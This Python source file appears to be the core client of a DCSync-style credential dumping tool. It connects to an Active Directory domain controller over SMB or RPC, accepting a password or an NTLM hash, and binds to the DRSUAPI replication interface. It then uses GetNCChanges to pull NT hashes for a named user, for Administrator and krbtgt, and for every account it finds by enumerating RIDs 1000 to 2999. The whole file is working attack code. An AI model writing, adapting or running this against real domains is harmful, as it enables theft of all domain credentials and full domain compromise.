from typing import Optional, List, Generator
from transport.tcp import TCPTransport
from transport.smb import SMBTransport
from transport.ntlm import NTLMAuth, compute_ntlm_hash
from rpc.dcerpc import DCERPCClient
from rpc.epm import EndpointMapper
from drsr.bind import DRSBind
from drsr.getncchanges import DRSGetNCChanges
from drsr.cracknames import DRSCrackNames
from drsr.dcinfo import DRSDomainControllerInfo
from drsr.structures import ReplicationData, DRS_EXTENSIONS
from config import DRSUAPI_UUID, DRSUAPI_VERSION, SyncConfig

class DRSRClient:
    def __init__(self, config: SyncConfig):
        self.config = config
        self.transport = None
        self.rpc = None
        self.drs_handle = None
        self.server_extensions = None
        self._domain_dn = None
        self._netbios_name = None  # NetBIOS domain name for CrackNames
        self._ntds_dsa_guid = None  # NtdsDsaObjectGuid for GetNCChanges
        self.session_key: Optional[bytes] = None
        
    def connect(self):
        if self.config.use_smb:
            self.transport = SMBTransport(
                host=self.config.target_dc,
                username=self.config.username,
                password=self.config.password,
                domain=self.config.domain,
                ntlm_hash=self.config.ntlm_hash,
                timeout=self.config.timeout
            )
            self.transport.connect()
            self.session_key = self.transport.session_key
        else:
            epm = EndpointMapper(self.config.target_dc, self.config.timeout)
            port = epm.map_endpoint(DRSUAPI_UUID, DRSUAPI_VERSION)
            
            if self.config.verbose:
                print(f"[*] DRSUAPI endpoint mapped to port {port}")
            
            self.transport = TCPTransport(
                self.config.target_dc, 
                port, 
                self.config.timeout
            )
            self.transport.connect()
            
            ntlm_auth = NTLMAuth(
                self.config.domain,
                self.config.username,
                self.config.password,
                self.config.ntlm_hash
            )
            
            self.rpc = DCERPCClient(self.transport, ntlm_auth=ntlm_auth)
            self.rpc.bind_with_auth(DRSUAPI_UUID, DRSUAPI_VERSION)
            self.session_key = self.rpc.session_key
            
            if self.config.verbose:
                print(f"[+] Authenticated RPC bind successful")
            
            bind_op = DRSBind(self.rpc)
            self.drs_handle, self.server_extensions = bind_op.bind()
            
            if self.config.verbose:
                print(f"[+] DRS bind successful")

            self._get_dc_info()
            self._resolve_domain_dn()
            return
        
        self.rpc = DCERPCClient(self.transport)
        self.rpc.bind(DRSUAPI_UUID, DRSUAPI_VERSION)
        
        bind_op = DRSBind(self.rpc)
        self.drs_handle, self.server_extensions = bind_op.bind()
        
        if self.config.verbose:
            print(f"[+] DRS bind successful")

        self._get_dc_info()
        self._resolve_domain_dn()
        
    def disconnect(self):
        if self.transport:
            try:
                self.transport.disconnect()
            except:
                pass
            self.transport = None
        self.rpc = None
        self.drs_handle = None

    def _get_dc_info(self):
        """Get NtdsDsaObjectGuid from the DC via DRSDomainControllerInfo."""
        dcinfo = DRSDomainControllerInfo(self.rpc, self.drs_handle)
        self._ntds_dsa_guid = dcinfo.get_dc_info(self.config.domain)

        if self._ntds_dsa_guid and self.config.verbose:
            import uuid
            guid_obj = uuid.UUID(bytes_le=self._ntds_dsa_guid)
            print(f"[*] NtdsDsaObjectGuid: {{{guid_obj}}}")

        if not self._ntds_dsa_guid:
            if self.config.verbose:
                print(f"[!] Warning: Could not get NtdsDsaObjectGuid, using zeros")
            self._ntds_dsa_guid = b"\x00" * 16

    def _resolve_domain_dn(self):
        cracker = DRSCrackNames(self.rpc, self.drs_handle)

        # Extract NetBIOS name from domain (first component, uppercase)
        # e.g., "lab.local" -> "LAB", "LAB" -> "LAB"
        if "." in self.config.domain:
            self._netbios_name = self.config.domain.split(".")[0].upper()
        else:
            self._netbios_name = self.config.domain.upper()

        # Use NetBIOS name for domain DN lookup
        self._domain_dn = cracker.get_domain_dn(self._netbios_name)

        if not self._domain_dn:
            dn_parts = [f"DC={part}" for part in self.config.domain.split(".")]
            self._domain_dn = ",".join(dn_parts)

        if self.config.verbose:
            print(f"[*] Domain DN: {self._domain_dn}")
    
    def get_user_secrets(self, username: str) -> Optional[ReplicationData]:
        import uuid

        cracker = DRSCrackNames(self.rpc, self.drs_handle)

        # Use NetBIOS name for NT4 account format (e.g., "LAB\administrator")
        # First resolve DN
        user_dn = cracker.resolve_user_dn(username, self._netbios_name)
        if not user_dn:
            if self.config.verbose:
                print(f"[-] Could not resolve user: {username}")
            return None

        if self.config.verbose:
            print(f"[*] User DN: {user_dn}")

        # Get the user's GUID (format 6 = DS_UNIQUE_ID_NAME)
        DS_UNIQUE_ID_NAME = 6
        from config import DS_NAME_FORMAT_NT4_ACCOUNT
        full_name = f"{self._netbios_name}\\{username}"
        guid_results = cracker.crack_names([full_name], DS_NAME_FORMAT_NT4_ACCOUNT, DS_UNIQUE_ID_NAME)

        target_guid = None
        if guid_results and guid_results[0]:
            guid_str = guid_results[0]  # e.g., '{2eee6fb7-df24-4123-b046-1cf667cbe6bd}'
            try:
                guid_obj = uuid.UUID(guid_str)
                target_guid = guid_obj.bytes_le
                if self.config.verbose:
                    print(f"[*] User GUID: {guid_str}")
            except ValueError:
                pass

        get_changes = DRSGetNCChanges(self.rpc, self.drs_handle, self._ntds_dsa_guid)
        return get_changes.get_user_secrets(user_dn, self._domain_dn, target_guid)
    
    def dump_all_users(self) -> Generator[ReplicationData, None, None]:
        """Dump all users by enumerating RIDs.

        This iterates through RIDs using CrackNames with SID format to find
        all users, then replicates each user's secrets individually.
        """
        import uuid
        from config import (
            DS_NAME_FORMAT_NT4_ACCOUNT, DS_NAME_FORMAT_FQDN_1779,
            DS_NAME_FORMAT_SID_OR_SID_HISTORY, DS_UNIQUE_ID_NAME
        )
        from parser.sid import get_domain_sid

        cracker = DRSCrackNames(self.rpc, self.drs_handle)
        get_changes = DRSGetNCChanges(self.rpc, self.drs_handle, self._ntds_dsa_guid)

        # First, get the domain SID by resolving Administrator (RID 500)
        admin_name = f"{self._netbios_name}\\Administrator"
        admin_dn_results = cracker.crack_names(
            [admin_name], DS_NAME_FORMAT_NT4_ACCOUNT, DS_NAME_FORMAT_FQDN_1779
        )

        if not admin_dn_results or not admin_dn_results[0]:
            if self.config.verbose:
                print("[-] Could not resolve Administrator to get domain SID")
            return

        # Get Administrator's GUID to replicate and extract domain SID
        admin_guid_results = cracker.crack_names(
            [admin_name], DS_NAME_FORMAT_NT4_ACCOUNT, DS_UNIQUE_ID_NAME
        )

        if not admin_guid_results or not admin_guid_results[0]:
            return

        # Replicate Administrator to get the domain SID
        admin_guid = uuid.UUID(admin_guid_results[0]).bytes_le
        admin_result = get_changes.get_user_secrets(
            admin_dn_results[0], self._domain_dn, admin_guid
        )

        if not admin_result or not admin_result.sid:
            if self.config.verbose:
                print("[-] Could not get domain SID from Administrator")
            return

        # Extract domain SID (remove the RID from the end)
        domain_sid = get_domain_sid(admin_result.sid)
        if not domain_sid:
            return

        if admin_result.nt_hash:
            yield admin_result

        seen_rids = {500}  # Already got Administrator

        # Enumerate RIDs: 500-502 (well-known), then 1000+ (user accounts)
        rids_to_try = [501, 502]  # Guest, krbtgt
        rids_to_try.extend(range(1000, 3000))  # User accounts typically start at 1000

        for rid in rids_to_try:
            if rid in seen_rids:
                continue
            seen_rids.add(rid)

            try:
                # Build SID string: S-1-5-21-<domain>-<rid>
                sid_string = self._build_sid_string(domain_sid, rid)

                # Try to resolve SID to DN
                dn_results = cracker.crack_names(
                    [sid_string], DS_NAME_FORMAT_SID_OR_SID_HISTORY, DS_NAME_FORMAT_FQDN_1779
                )

                if not dn_results or not dn_results[0]:
                    continue

                user_dn = dn_results[0]

                # Skip computer accounts and non-user objects
                if user_dn.upper().startswith("CN=") and ",CN=COMPUTERS," in user_dn.upper():
                    continue

                # Get the object's GUID
                guid_results = cracker.crack_names(
                    [sid_string], DS_NAME_FORMAT_SID_OR_SID_HISTORY, DS_UNIQUE_ID_NAME
                )

                if not guid_results or not guid_results[0]:
                    continue

                target_guid = uuid.UUID(guid_results[0]).bytes_le

                # Replicate this object's secrets
                result = get_changes.get_user_secrets(user_dn, self._domain_dn, target_guid)

                if result and result.nt_hash:
                    yield result

            except Exception as e:
                if self.config.verbose:
                    print(f"[-] Error with RID {rid}: {e}")
                continue

    def _build_sid_string(self, domain_sid: bytes, rid: int) -> str:
        """Build a SID string from domain SID bytes and RID."""
        import struct

        # Domain SID format: revision (1) + sub_auth_count (1) + authority (6) + sub_auths (4 each)
        if len(domain_sid) < 8:
            return ""

        revision = domain_sid[0]
        sub_auth_count = domain_sid[1]
        authority = domain_sid[2:8]

        # Parse identifier authority (big-endian 48-bit value, usually 5 for NT Authority)
        auth_value = int.from_bytes(authority, 'big')

        # Parse existing sub-authorities
        sub_auths = []
        for i in range(sub_auth_count):
            offset = 8 + (i * 4)
            if offset + 4 <= len(domain_sid):
                sub_auth = struct.unpack("<I", domain_sid[offset:offset+4])[0]
                sub_auths.append(sub_auth)

        # Build SID string: S-<revision>-<authority>-<sub1>-<sub2>-...-<rid>
        parts = [f"S-{revision}-{auth_value}"]
        parts.extend(str(sa) for sa in sub_auths)
        parts.append(str(rid))

        return "-".join(parts)
    
    def get_domain_dn(self) -> str:
        return self._domain_dn or ""
    
    def __enter__(self):
        self.connect()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.disconnect()
